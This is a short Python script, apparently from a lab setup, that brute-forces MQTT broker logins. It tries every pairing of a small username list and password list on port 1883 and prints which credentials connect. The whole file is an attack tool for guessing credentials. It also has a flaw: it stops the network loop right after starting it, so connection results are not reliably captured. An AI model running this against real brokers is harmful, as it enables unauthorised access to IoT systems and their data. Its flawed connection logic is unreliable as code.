import paho.mqtt.client as mqtt

BROKER = 'broker'
PORT = 1883
TOPIC = 'sensor/temperature'

usernames = ['admin', 'attacker', 'sensor']
passwords = ['1234', 'password', 'letmein', 'badpass', 'realpass']

def try_login(username, password):
	result = {"connected": False}

	def on_connect(client, userdata, flags, rc):
		result["rc"] = rc
		result["connected"] = (rc == 0)

	client = mqtt.Client()
	client.username_pw_set(username, password)
	client.on_connect = on_connect

	try:
		client.connect(BROKER, PORT, 60)
		client.loop_start()
		client.loop_stop()
		client.disconnect()

		if result["connected"]:
			print(f"[SUCCESS] Connected with {username}:{password}")
		else:
			print(f"[FAILURE] {username}:{password} -> Connection Refused (RC={result['rc']})")

	except Exception as e:
		print(f"[FAILURE] {username}:{password} -> Exception: {e}")

for user in usernames:
	for pwd in passwords:
		try_login(user, pwd)
